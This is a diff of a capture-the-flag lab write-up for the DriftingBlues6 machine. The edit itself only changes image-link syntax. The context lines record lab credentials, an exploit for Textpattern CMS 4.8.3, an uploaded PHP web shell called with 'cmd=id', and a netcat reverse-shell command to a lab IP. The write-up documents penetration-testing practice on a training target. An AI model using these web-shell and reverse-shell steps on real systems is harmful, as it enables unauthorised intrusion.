@@ -147,9 +147,9 @@ creds.txt  ferox.txt  full_tcp-scan.txt  open-port_scan.txt  spammer.zip  spamme
 mayer:lionheart 
 ```
 
-![](Pasted%20image%2020260604042515.png)
+![[Pasted image 20260604042515.png]]
 
-![](Pasted%20image%2020260604042450.png)
+![[Pasted image 20260604042450.png]]
 
 [Textpattern CMS (opens an external link in a new window)](https://textpattern.com/) (v4.8.3)
 
@@ -180,11 +180,11 @@ Copied to: /home/kali/CTF/OffSec/Play/DriftingBlues6/49620.py
 
 http://192.168.203.219/textpattern/textpattern/index.php?event=file
 
-![](Pasted%20image%2020260604052130.png)
+![[Pasted image 20260604052130.png]]
 
 http://192.168.203.219/textpattern/files/test.php?cmd=id
 
-![](Pasted%20image%2020260604052417.png)
+![[Pasted image 20260604052417.png]]
 
 http://192.168.203.219/textpattern/files/test.php?cmd=nc%20192.168.45.178%204444%20-e%20/bin/bash
 
